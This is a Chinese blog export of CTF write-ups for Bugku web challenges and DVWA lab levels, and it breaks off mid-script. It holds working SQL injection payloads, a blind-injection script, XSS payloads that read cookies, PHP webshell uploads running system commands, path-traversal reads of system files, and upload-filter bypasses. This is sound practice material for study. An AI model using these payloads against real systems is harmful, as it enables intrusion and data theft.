三、第40题（PHP_encrypt_1）题目给出了压缩包，下载打开，发现是某种加密方式，需要我们阅读代码，写出解密代码 &lt;?php function encrypt($data,$key) { $key = md5(&apos;ISCC&apos;); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) { if ($x == $klen) { $x = 0; } $char .= $key[$x]; $x+=1; } for ($i=0; $i &lt; $len; $i++) { $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); } return base64_encode($str); } ?&gt; 参考网上的大佬写的代码，该题涉及密码学，逆向，web &lt;?php function decrypt($str) { $mkey = &quot;729623334f0aa2784a1599fd374c120d&quot;; $klen = strlen($mkey); $tmp = $str; $tmp = base64_decode($tmp); // 对 base64 后的字符串 decode $md_len = strlen($tmp); //获取字符串长度 for ($i=0; $i &lt; $md_len; $i++) { // 取二次加密用 key; if ($x == $klen) // 数据长度是否超过 key 长度检测 $x = 0; $char .= $mkey[$x]; // 从 key 中取二次加密用 key $x+=1; } $md_data = array(); for($i=0;$i&lt;$md_len;$i++) { // 取偏移后密文数据 array_push($md_data, ord($tmp[$i])); } $md_data_source = array(); $data1 = &quot;&quot;; $data2 = &quot;&quot;; foreach ($md_data as $key =&gt; $value) { // 对偏移后的密文数据进行还原 $i = $key; if($i &gt;= strlen($mkey)) {$i = $i - strlen($mkey);} $dd = $value; $od = ord($mkey[$i]); array_push($md_data_source,$dd); $data1 .= chr(($dd+128)-$od); // 第一种可能, 余数+128-key 为回归数 $data2 .= chr($dd-$od); // 第二种可能, 余数直接-key 为回归数 } print &quot;data1 =&gt; &quot;.$data1.&quot;&lt;br&gt;\n&quot;; print &quot;data2 =&gt; &quot;.$data2.&quot;&lt;br&gt;\n&quot;; } $str = &quot;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&quot;; decrypt($str); ?&gt; 四、第41题（文件包含2）由于无法打卡该题目网站，本题略 四、第42题（文件包含2）这题考的是代码审计首先，我们提交login发现没反应，题目提示hint那么我们传入？hint=1试试，发现 &lt;?php error_reporting(0); include_once(&quot;flag.php&quot;); $cookie = $_COOKIE[&apos;ISecer&apos;]; if(isset($_GET[&apos;hint&apos;])){ show_source(__FILE__); } elseif (unserialize($cookie) === &quot;$KEY&quot;) { echo &quot;$flag&quot;; } else { ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt; &lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php } $KEY=&apos;ISecer:www.isecer.com&apos;; ?&gt; 然后开始审计代码发现，这是个php反序列。 $cookie = $_COOKIE[&apos;ISecer&apos;]; 代码逻辑就是，传入一个cookie：ISecer，如果ISecer反序列化的结果和KEY相等，就弹出flag。也就是cookie的参数的值必须为$kEY的值的序列化。注意$key的值在调用的时候还没有被定义构造序列化字符串 &lt;?php echo serialize(&apos;&apos;); ?&gt; 输出s:0:’’ 然后我们抓包将Cookie的值改为ISecer=s:0:’’，即可得出flag 五、第43题（sql2）该题为post型的sql注入，尝试了各种sql注入发现都被过滤了，当时那个绝望呀。去看别人博客提示说是DS_Store源码泄露，然后就需要用到python脚本来跑一下了，发现了flag目录，直接访问，然后就得到了flag。DS_Store下载地址：https://github.com/lijiejie/ds_store_exp 我们了解下什么是DS_Store源码泄露 六、第45题（Trim的日记本）登入，额发现题目的出了点问题，不够不影响我们解题，扫描登录http://123.206.87.240:9002/show.php提交flag竟然是真的。 七、第46题（login2）第一步抓包可以发现这边有一堆base64加密的编码解密 $sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;; if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password)){ 这段代码的意思大概就是，通过输入不存在用户，用union select 构造出指定密码的md5值，即可登入成功username=1’ union select 1,md5(1)#&amp;password=1 八、第47题（login3）我们先尝试下账号admin密码pass,发现返回密码错误。账号admin’,密码pass发现说明本题应该使用布尔盲注再构造语句，进行几次的基于bool盲注的注入，查看一下有没有绕过一些特殊的语句 username=’^(1)^1#&amp;password=123在测试过程中，发现过滤了 ‘空格’ 以及 ’=‘ ，则空格可以使用 () 代替，=可以使用 &lt;&gt; 代替,还有and information。那么我们应该想到使用脚本，毕竟手动盲注什么时候是个头，然后将得到的密码MD5解密附上脚本代码 import requests guess = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/=&quot; url = &quot;http://123.206.31.85:49167/&quot; database=&quot;&quot; for i in range(0,35): for j in guess: # uname = &quot;admin&apos;^(ascii(mid(database()from(%i)))&lt;&gt;%s)^0#&quot;%(i,ord(j)) uname = &quot;admin&apos;^(ascii(mid((select(password)from(admin))from(%i)))&lt;&gt;%s)^0#&quot;%(i,ord(j)) data = { &quot;username&quot;:uname, &quot;password&quot;:&quot;123&quot; } res = requests.post(url=url,data=data).text if &quot;password error&quot; in res: database += j print(database) break 大家也可以参考下这篇文章https://blog.csdn.net/qq_42133828/article/details/86815663 九、第48题（login4）经过尝试发现题目说只有admin可以看到flag又说admin不允许登录参考这篇文章https://blog.csdn.net/csu_vc/article/details/79619309 十、文件上传2（湘桥杯）不知道为什么进不了题目大家可以参考下这篇文章https://www.jianshu.com/p/59730b290120 十一、秋名山老司机直接用python脚本即可得出flag #coding:utf-8 import requests import re url = &quot;http://123.206.87.240:8002/qiumingshan/&quot; res = requests.session() s = res.get(url).text num = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;,s).group() result = eval(num) data = {&apos;value&apos;:result} print(res.post(url=url,data=data).text)]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku-29-36 writeup(web)]]></title>
    <url>%2F2019%2F04%2F08%2Fbugku-29-36%2F</url>
    <content type="text"><![CDATA[一、第29题login1(SKCTF)打开题目，发现是一个管理登入界面。且题目提示我们这是到sql约束攻击的题目。那么我们先简单介绍下什么是sql约束攻击 (1)、约束SQL注入的原理就是利用的约束条件，比如最长只能有10个字符的话，如果你输入的是aaaaaaaaaabb(12位），那么保存在数据库里的就是aaaaaaaaaa(10位)，那么别人用aaaaaaaaaabb注册一个用户名，就可以登陆。 （2）、还有一个可以利用的地方就是SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的，也就是说”abc”==”abc “，同样我们可以通过注册用户名为”abc “的账号来登陆”abc”的账号。 我们先注册下,账号为admin,密码随意，发现用户已经存在，那么我们使用账号为admin+一个空格,密码任意，注册，然后登入发现，成功得到flag. 二、第30题（你从哪里来）打开题目发现，题目有一行字，你来着Google吗。那么我们应该想到http头部的referer参数 referer参数的作用简单说就是告诉服务器我是从哪个页面链接过来的 我们抓包添加referer参数即可得到flag。 三、第31题（md5 collision）打开题目，题目要求我们传输参数a,我们传入参数a的值为1，发现输错false.那么我们考虑题目所提到的MD5碰撞，首先我们先介绍下什么是MD5碰撞 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。 下面是常见的0e开头的md5和原值：0e开头的md5和原值： s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 更多的大家可以自己去百度 上面的那些0E开头的字符串都可以作为参数的值传入，如 http://123.206.87.240:9009/md5.php?a=s878926199a 四、第32题（程序员本地网站）打开题目发现，题目里写着请从本地访问。那么我们应该想到http头部的X-Forwarded-For参数 我们先介绍下X-Forwarded-For参数X-Forwarded-For: 简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 我们抓包进行添加X-Forwarded-For参数，即可得出flag 五、第33题（各种绕过哟）进入这道题我们通过阅读php代码，我们发现只要使uname的sha1和值与passwd的sha1的值相等即可，但是同时他们两个的值又不能相等，我们尝试构造数组。成功得出flag 六、第34题（web8）根据题目提示的txt.并且分析源码我们可以得出以下几点有用信息1、f的值从fn文件中取出2、ac的值和类型与f的值和类型完全相等时，即可得出flag 寻找flag, http://123.206.87.240:8002/web8/flag.txt 可以看出flag.txt的文件的内容为flags那么我们让fn指向flag.txt文件，ac为该文件的内容；构造payload http://123.206.87.240:8002/web8/?ac=flags&amp;fn=flag.txt 七、第35题（细心）首先打开题目发现是一个404 not found 查看源码并没有什么发现。想到题目的提示 想办法变成admin，那么我们使用御剑工具扫描下后台，发现robots.txt文件robots.txt文件简单说就是网络爬虫规则访问robots.txt文件，发现resusl.php文件访问resusl.php文件发现，题目提示我们不是管理员，需要传入参数x那么我们传入参数x=admin 八、第36题（求getshell） 把请求头里面的Content-Type字母改成大写进行绕过 .jpg后面加上.php5其他的都被过滤了好像 content-Type的值改为image/jpg（题目要求我们传入image） 如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 26-27 writeup(web)]]></title>
    <url>%2F2019%2F03%2F19%2Fbugku-26-27%2F</url>
    <content type="text"><![CDATA[一、第26题（过狗一句话）打开链接发现一篇空白，抓包也没什么发现。那么我们只能分析上面那段代码了explode()函数就是把$poc变量用#号来分割开来。那么$poc_2就是assert,他和最后一句代码构造成了assert()函数,assert函数功能跟eval类似，可以把里面的内容当作代码来执行。 那么我们构造payload为?s=print_r(scandir(&#39;./&#39;))，扫描出描本级目录下的文件。（这其实是一种xss攻击）发现了flag_sm1skla1.txt文件。访问该文件即可得出flag拓展：我们扫描上级目录 http://123.206.87.240:8010/?s=print_r(scandir(%27../%27)) 根据目录结构应该是linux系统，hosts文件应该在etc里面 http://123.206.87.240:8010/?s=print_r(readfile(%27../etc/hosts%27)) 一、第27题（字符？正则？）打开题目，是一段代码 &lt;?php highlight_file(&apos;2.php&apos;); $key=&apos;KEY{********************************}&apos;; $IM= preg_match(&quot;/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); if( $IM ){ die(&apos;key is: &apos;.$key); } ?&gt; 分析这段代码可以发现，只要我们构造出一个符号条件的KEY作为参数传入即可得到flag,突然发现我的正则学了和没学一样。 这边先介绍下 preg_match — 执行一个正则表达式匹配 preg_match ( $pattern , $subject , $matches ) 搜索subject与pattern给定的正则表达式的一个匹配. 参数 ： pattern : 要搜索的模式，字符串类型(正则表达式)。subject : 输入的字符串。matches :（可有可无）如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。 返回值 ： preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。 实例1： $label = &apos;content/112&apos;; $a = preg_match(&apos;#content/(\d+)#i&apos;, $label, $mc); var_dump($a); var_dump($mc); 输出： int(1) array(2) { [0]=&gt; string(11) &quot;content/112&quot; [1]=&gt; string(3) &quot;112&quot; } 开始分析下题目中的正则表达式定界符：/和/（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）； . （一个点）：表示可以匹配任何字符； * ：前面的字符重复零次或多次； {n,m} ：最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符; \ （反斜线）：后面的字符被转义； [a-z] ：在a到z中匹配 ； [[:punct:]] ：匹配任何标点符号； /i ：表示这个正则表达式对大小写不敏感； 我们构造id=keykeyaaaakey:/a/keyz;]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 22-24 write up（web）]]></title>
    <url>%2F2019%2F03%2F19%2Fbugku-22-24%2F</url>
    <content type="text"><![CDATA[一、第22题（速度要快)首先我们查看源码 &lt;/br&gt;我感觉你得快点!!!&lt;!-- OK ,now you have to post the margin what you find --&gt; 发现有post需要提交，参数为marign 那么我们开始抓包，然后发现是base64编码的flag,解码后，输入flag,发现flag错误。额，我们再次抓包，发现flag又变化了。怪得题目说我觉得你得快点。我有尝试了几次发现还是不行，看来只能借助python脚本了 import requests import base64 url = &apos;http://123.206.87.240:8002/web6/&apos; s = requests.session() flag = s.get(url).headers[&apos;flag&apos;] # flag在响应头里 #为了下面使用split不报错，ba64decode操作的对象是byte类型的字符串，而split函数要用str类型 flag = base64.b64decode(flag).decode() flag = base64.b64decode(flag.split(&quot;:&quot;)[1]).decode() # 获取flag后的值 payload = {&apos;margin&apos;: flag} print(s.post(url, data = payload).text) # post方法上传 python中str是经过编好码的字符串，如unicode,gb2312,ascii编码，可以表示不同语言中的字符，可以解码成bytebyte是字节，只能是ascii码0-255的字符，表示未经编码处理的原始字符串 split函数简单的介绍 str与byte的简单的转化方法： flag=flag.decode()//byte转为str flag=flag.encode()//str转为byte 二、第23题（cookie欺骗）http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=打开题目发现，filename参数后面是一串base64编码，进行解码得keys.txt.我们把index.php进行base64编码后放在filename参数的后面，进行输入 http://123.206.87.240:8002/web11/index.php?line=1&amp;filename=aW5kZXgucGhw 改变line后面的数字即可一行一行的输出index.php的内容这样子太慢了，我们写个python脚本来实现。 import requests def getHTMLText(url): try: r = requests.get(url,timeout=30) r.raise_for_status() r .encoding = r.apparent_encoding return r.text except: return&quot;产生异常&quot; if __name__==&quot;__main__&quot;: a=30 for i in range(a): url = &quot;http://123.206.87.240:8002/web11/index.php?line=&quot;+str(i)+&quot;&amp;filename=aW5kZXgucGhw&quot; print(getHTMLText(url)) 输出index.php的网页源码 &lt;?php error_reporting(0); $file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;); $line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); $file_list = array( &apos;0&apos; =&gt;&apos;keys.txt&apos;, &apos;1&apos; =&gt;&apos;index.php&apos;, ); ​ if(isset($_COOKIE[‘margin’]) &amp;&amp; $_COOKIE[‘margin’]==’margin’){ $file_list[2]=&apos;keys.php&apos;; } if(in_array($file, $file_list)){ $fa = file($file); echo $fa[$line]; } ?&gt; 这段代码的意思是flag在keys.php文件里，我们需要传入cookie:margin=margin才可以看到源码。进行操作后发现是空白，我们查看源码发现了flag 三、第24题（never give up）查看源码发现那么我们访问http://123.206.87.240:8006/test/1p.html发现是bugku的主页，被重定向了。那么我们使用 view-source:http://123.206.87.240:8006/test/1p.htm 直接访问源码，发现源码中有一部分被url编码了，那么我们进行解码，发现是base64编码，再解码发现是url编码，那么我们再解码，终于得出了以下关键的部分 &quot;;if(!$_GET[&apos;id&apos;]) { header(&apos;Location: hello.php?id=1&apos;); exit(); } $id=$_GET[&apos;id&apos;]; $a=$_GET[&apos;a&apos;]; $b=$_GET[&apos;b&apos;]; if(stripos($a,&apos;.&apos;)) { echo &apos;no no no no no no no&apos;; return ; } $data = @file_get_contents($a,&apos;r&apos;); if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4) { require(&quot;f4l2a3g.txt&quot;); } else { print &quot;never never never give up !!!&quot;; } ​ ?&gt; 看下这部分源码发现有很多要求才可以看到flag,那么尝试下直接访问 http://123.206.87.240:8006/test/f4l2a3g.txt 看到flag了。]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 17-20 write up（web）]]></title>
    <url>%2F2019%2F03%2F14%2Fbugku-17-20%2F</url>
    <content type="text"><![CDATA[一、第17题（输入密码查看flag）。暴力破解，可得密码，然后输入密码可得flag 二、 第18题(点击一百万次)查看源码可以发现，url以post的方式提交点击的次数，那么使用hacker的post功能，直接修改clicks=1000000,即可得出flag 三、第19题（备份是个好习惯）小知识：备份文件的扩展名一般为*.swp，.bak打开题目是一串字母，应该是MD5加密我们拿去解密下，竟然为空。看看题目的提示，备份是个好习惯，是让我们寻找 .bak文件的我们用御剑扫描后台，得出那么尝试下http://123.06.87.240:8002/web16/index.php.bak成功下载源码 &lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once &quot;flag.php&quot;; ini_set(&quot;display_errors&quot;, 0); $str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);//代码从?后开始截取到str中，也就是变量后开始截取字符串 $str = substr($str,1);//取$str中左边第1位开始取1位。 $str = str_replace(&apos;key&apos;,&apos;&apos;,$str);//在字符串$str中找到字符串key，并把它替换成空； parse_str($str);//把查询字符串解析到变量中； echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){ echo $flag.&quot;取得flag&quot;; } 代码要求我们构造出key1和key2的md5值相等，而它们本身却不相等，这时候用到一个小知识点：md5无法对数组进行构造，构造的结果都为NULL，这样我们只要让key1和key2是两个数组就可以了，（kekeyy绕过过滤key） 四、第20题（成绩单）在这里插入代码片我们先输入1发现输出输入-1发现没有输出信息说明存在sql注入。那么我们尝试下输入 -1&#39; union select 1,2,3,database()#发现flag的所在的数据库输入-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#爆出flag所在的表 输入-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#爆出flag所在的字段 输入-1&#39; union select 1,2,3,skctf_flag from fl4g# 爆出flag为BUGKU{Sql_INJECT0N_4813drd8hz4}]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA之xss]]></title>
    <url>%2F2019%2F03%2F14%2FDVWA-xss%2F</url>
    <content type="text"><![CDATA[一、反射（reflected）型（一）、尝试low等级输入正常数字，返回以下内容再输入&lt;xss&gt;发现，只输出了hello我们使用火狐的开发者工具查看下元素发现hello的后面是一对xss标签我们进行弹窗测试输入&lt;script&gt;alert(/xss/)&lt;/script&gt;发现弹窗，说明存在xss注入介绍javaScript的3个弹窗函数alert() ,confirm() ,prompt()攻击者思路攻击者web设计构造估计的js脚本 document.location就是页面的内容定位到指定的位置，他会访问参数中的地址，参数里面写上刚刚新建的php文件的网址，document.cookie就是赋值给这个php的cookie参数，这个cookie值最终会出现在网站127.0.0.1/cookie.php中构造并发送攻击url这样子还不行还需要url编码最后劫持会话修改cookie，修改为之前获取的cookie值。 （二）、尝试medium等级，只要在&lt;srcipt&gt;标签中插入一个&lt;script&gt;即可，&lt;src&lt;srcipt&gt;ipt&gt;，因为他过滤了&lt;sript&gt;标签其他步骤与low等级一样。（三）尝试high等级。上面的方法都失效了，那么我们想到了img标签也是可以执行js代码的 &lt;img src= x onerror=alert(1)&gt; 使用iframe标签也可以成功注入&lt;iframe onload=alert(1)&gt;说明只过滤了script标签（四）impose等级查看源码发现htmlspecialchars函数那么这是函数是干啥的呢？可以把 &amp;过滤成&amp;amp; &quot;过滤成&amp;quto; &apos;过滤成&amp;apos; &lt;过滤成&amp;lt; &gt;过滤成&amp;gt; 二、存储型（stored）反射（一）、尝试low等级，使用火狐浏览器开发者工具，发现name被限制为10个字符，message被限制为50个字符.这对我们xss注入是不够的。那么我们就抓包发送name,message参数成功绕过了限制存储型的数据是存在数据库里，大家可以选择setup/resetDB重置数据库，清楚数据（二）尝试medium等级发现name过滤alert ,和script标签，message过滤了script标签。尝试script大小写发现无法弹窗这个是部分源码我们尝试iframe标签 txtName=&lt;iframe onload=alert(/xss/)&gt;&amp;mtxMessage=&lt;iframe src =1 onload=alert(/ss/)&gt;&amp;btnSign=Sign+Guestbook 发现name成功弹窗,但是message不行，不过没关系，可以进行xss注入 （三）、尝试high等级和medium的方法一样，不同是high等级的message对&lt; &gt; “ &amp; ‘进行了处理（四）、尝试impose等级查看源码name和message都对&lt; &gt; \” &amp; \’进行了过滤 三、DOM型XSS（一）、尝试low等级我们尝试注入 http://localhost/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(/hack/)&lt;/script&gt; 成功进行注入，查看源码发现，没有任何保护措施（二）、尝试medium等级发现low等级的方法已经失效了，经过尝试可以发现，script标签被过滤了，过滤成English。查看源码发现只过滤了script标签那么我们尝试 下&lt;img src= x onerror=alert(1)&gt;页面没有反应查看网页源代码，发现我们的语句被插入到了value值中，但是并没有插入到option标签的值中，使用img标签没有发挥作用我们尝试闭合option `http://localhost/DVWA/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;img src= x onerror=alert(1)`&gt; 发现还没没有闭合成功。我们闭合用的&gt;&lt;被闭合到option的值当中去了。那么我们往更高一层的select标签闭合 http://localhost/DVWA/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&apos;hhh&apos;)&gt; 成功注入（三）、尝试high等级尝试了一番之后没有结果我们查看下源码，发现源码使用了白名单的方法，那我们是不是可以使用#注入，第一次从本地写入，第二次刷新的时候执行我们注入的xss http://localhost/DVWA/vulnerabilities/xss_d/?default=English#&lt;/option&gt;&lt;/select&gt;&lt;BODY ONLOAD=alert(document.cookie)&gt; 成功注入 （四）、impose等级发现我们输入什么都会在客户端体现，查看源码发现在客户端进行了保护。这段代码的功能是不会对URL输入进行URL编码过的内容再进行URL解码从而杜绝了DOM型XSS，这就是为什么我们输入什么就会在框中体现]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[file upload]]></title>
    <url>%2F2019%2F03%2F14%2Ffile-upload%2F</url>
    <content type="text"><![CDATA[一、尝试low等级我们上传一个phpinfo.php文件，文件内容为&lt;?php echo pphpinfo()?&gt;,把路径拼接起来，输入 http://localhost/DVWA/hackable/uploads/phpinfo.php 成功获得执行我们上次的文件我们再上传个一句话木马文件然后直接尝试系统命令 http://localhost/DVWA/hackable/uploads/cmd.php ?cmd=system(&apos;net user&apos;); 二、尝试medium等级上传一句话木马文件，发现报错，只支持jpeg和png格式的图片那么我们抓包看看，上传成功和上传不成功的包有什么差别，然后就是不断的尝试，不端地把上传不成功的包与上传成功的不同之处改成和上传成功的包相同，然后重新发送，发现了破解的办法上传cmd.php文件，然后把文件类型改为imag/jpeg，重新发送就可以了。三、high等级前面的方法都不能用了。尝试了文件后缀名和文件内容发现都失败了那么我们就想到了”制作内涵图“，就是把文件和图片合并成一张图片在cmd窗口下用命令结合 copy 1.jpg/b +1.txt/a 2.jpg 结合成2.jpg我们用编辑器打开，在文件末尾发现了我们的一句话木马 那既然传上去了，那么我们要怎么用呢首先我们需要切换下服务器，切换成nginx在phpini配置文件里把下面这个参数改为一，默认是1然后输入http://localhost/DVWA//hackable/uploads/2.jpg/2.php即可上传]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[file includes]]></title>
    <url>%2F2019%2F03%2F14%2Ffile-includes%2F</url>
    <content type="text"><![CDATA[一、前置知识1、什么是文件包含一种代码处理方法，函数如include,require等，参数是文件名。2、文件包含漏洞文件名的参数用户可控且过滤不严，被攻击者偷梁换柱 二、尝试low等级打开文件包含题目会发现以下提示，我们找到php.ini配置文件（一般在安装目录里），把 allow_url_include的值改成on，然后重启phpstudy即可The PHP function allow_url_include is not enabled我们点击文件一、文件2、文件3、发现了下图的规律。那么我们尝试下输入 http://localhost/DVWA/vulnerabilities/fi/?page=test.php 那么我们就可以利用这个漏洞了，输入 http://localhost/DVWA/vulnerabilities/fi/?page=..\..\php.ini ..\的意思是返回上一级目录。因为php.ini在DVWA目录下，所以使用..\..\ 直接输出了这个文件的内容 那么问题又来了，读取其他目录的php脚本会怎样，显示内容还是执行php代码 输入 http://localhost/DVWA/vulnerabilities/fi/?page=..\..\phpinfo.php 这说明了文件包含不仅仅显示内容还会执行文件。 那什么会执行远程文件吗？我们再次尝试可以执行并且非php文件里面只要包含php代码就可以执行 那么问题又来了。远程执行php文件和非php文件有什么差别吗？当然有了，以上面的phpinfo.php和phpinfo.txt为例，进行说明phpinfo.php是在攻击者的web服务器上执行，这毫无意义，我们期望的是在受害者的web服务器上执行，所以phpinfo.txt才是正解，（phpinfo.txt在受害者的web服务器上执行） 三、尝试medium等级用low等级的方法发现依然成功。但是他和low的等级有什么差别吗差别在于它过滤了../而low的等级没有。第一张图为low等级，第二张图为medium等级代码。可以发现差别在于str_place()函数他把我们传入的参数中的../和..\&quot;替换成了空。还有https://和http://替换成了空 那么medium等级的远程文件可以执行吗。当然可以了既然过滤了http://那么我们可以使用httphttp://://如下图 四、high等级我们尝试了medium等级的方法，进行本地文件执行发现以下错误经常一番尝试发现只执行以file开头的文件。那么这里就不得不提到file协议了 那么什么是files协议呢就是文本传输协议，访问本地计算机中的文件 输入 http://localhost/DVWA/vulnerabilities/fi/?page=file://F:\php\PHPTutorial\WWW\DVWA\phpinfo.php file://后面是本地路径，成功执行本地文件也可以查看系统文件 http://localhost/DVWA/vulnerabilities/fi/?page=file://C:\windows\win.ini 那么怎样进行远程文件执行呢medium方法不可以，查看源码，可知用fnmatch()函数限制参数文件的开头进入impose等级那么要如何远程执行呢，要就有把文件放在图片里，然后上传到web服务器，怎么把文件放在图片里这篇博客里的high等级部分说明了]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Brute Force]]></title>
    <url>%2F2019%2F03%2F09%2FBrute-Force%2F</url>
    <content type="text"><![CDATA[一、 第一题先从难度是low的开始。我们尝试了下admin’# 直接把密码注释掉，成功破解。我们尝试下medium等级还是尝试了下admin’#，发现密码错误，看来这个漏洞被防护了 首先我们抓包看下http请求头的信息，发现可以在http头部看到看到我们提交的账号密码，既然这样我们使用owasp zap 软件暴力破解。这是我使用的字典，大家可以去百度搜索更多的字典暴力成功破解出账号密码。下面我们尝试high等级，发抓包发现多了个user_token(它的职责是保护用户的用户名及密码多次提交，以防密码泄露。)且每一次的user_take会被记录到下一次请求头里的referrer里。这样上面的方法我们就不能使用了。但是认真观察，我们可以发现第一次进登录页面是没有user_token，这就是突破口。那么就可以一直在登录界面和第一次登录进行破解。还有一种思路是虽然加了user_token,但是并没有对尝试的次数进行限制，我们可以先获取user_token，然后用user_token加上用户密码验证身份。我们使用python脚本自动化爆力破解(第二种思路)。 from bs4 import BeautifulSoup import requests header={ &apos;GET&apos;: &apos;http://localhost/DVWA/vulnerabilities/brute/ HTTP/1.1&apos;, &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&apos;, &apos;Accept&apos;:&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;, &apos;Accept-Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;, &apos;Referer&apos;:&apos;http://localhost/DVWA/vulnerabilities/brute/&apos;, 